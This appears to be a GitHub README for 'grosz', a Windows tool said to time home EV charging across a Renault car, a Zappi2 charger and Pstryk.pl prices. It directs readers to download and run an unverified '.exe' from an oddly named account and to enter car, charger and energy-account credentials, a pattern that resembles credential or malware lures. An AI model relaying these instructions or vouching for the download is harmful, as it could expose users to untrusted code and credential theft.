# ⚡ grosz - Save money on home car charging

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosaceous-abwatt605/grosz/releases)

## 📖 About the software

Grosz manages your home electric vehicle charging. It connects your Renault vehicle, your MyEnergi Zappi2 charger, and your Pstryk.pl dynamic energy tariff. The software calculates the best times to charge your car based on current electricity prices. It starts and stops the charging process to ensure you pay the lowest possible rate for your energy. By automating these decisions, the application lowers your monthly electricity bills for your vehicle.

## 🛠 Prerequisites

Your computer must meet these requirements to run the software:

* Windows 10 or Windows 11 operating system.
* An active internet connection.
* Your Renault login credentials.
* Your MyEnergi account details.
* An active subscription or account with Pstryk.pl.

## 📥 Downloading the application

You must download the installation file from the official releases page. 

[Download Version 1.0 here](https://github.com/Rosaceous-abwatt605/grosz/releases)

1. Navigate to the link above.
2. Look for the section labeled "Assets."
3. Click the file that ends in `.exe`. 
4. Save the file to your computer.

## ⚙️ Setting up the application

1. Find the downloaded `.exe` file in your Downloads folder.
2. Double-click the file to begin the installation.
3. Follow the on-screen instructions to finish the setup process.
4. Launch the application from your desktop or Start menu.

## 🔑 Linking your accounts

The software needs access to your accounts to monitor prices and manage charging.

1. Open the application settings menu.
2. Enter your Renault email and password.
3. Enter your MyEnergi Zappi2 login information.
4. Select Pstryk.pl from the provider list and input your account token or API key.
5. Click the "Save" button to confirm your changes.

The application checks the connection status. If a connection fails, check your login details and try again.

## 🔋 How to charge your car

1. Plug your charging cable into your car and the Zappi2 station.
2. Open the grosz application.
3. Select your desired departure time.
4. Set your target battery percentage.
5. Click "Enable Smart Charging."

The application monitors energy market data from Pstryk.pl. It waits for the price to reach its lowest point. Once the optimal window arrives, the software sends a command to your Zappi2 to begin charging. The software stops the charge automatically when the car reaches your target battery level or when the scheduled departure time nears.

## 📈 Monitoring your savings

The main dashboard window displays your current energy usage. It shows the current electricity price from Pstryk.pl. You can view a graph that plots your historical savings over the last week or month. This data helps you understand how much you reduce your expenses by using the automated charging features.

## ❓ Troubleshooting common issues

**The application fails to connect to my Zappi2:**
Verify your internet connection. Check the Zappi2 device to ensure it remains connected to your home Wi-Fi network. Restart the application if the connection remains unresponsive.

**Charging stopped before the car finished:**
Check your departure time settings. The application prioritizes hitting your target battery percentage before the time you specified. If you need to depart earlier, update the departure time in the dashboard.

**The price data looks incorrect:**
Ensure your Pstryk.pl account is active and your API key is correct. The application updates price data every hour to reflect current energy market conditions.

**The application will not open:**
Close any old versions of the software. Restart your computer if the problem persists. You can also re-download the installation file and run it again to fix damaged files.

## 🛡 Security and privacy

The software stores your credentials locally on your computer. It uses encrypted storage to ensure your login information remains safe. The application only accesses your energy data to perform charging calculations. It never shares your personal information with external parties. You can clear your stored credentials at any time by selecting "Clear Data" in the settings menu.

## 🗓 Future updates

The software checks for updates whenever you launch it. If a new version exists, a notification appears on your screen. Click "Download Update" to install the latest features and security improvements. Keep the application updated to ensure the best compatibility with your electricity provider and vehicle manufacturer APIs.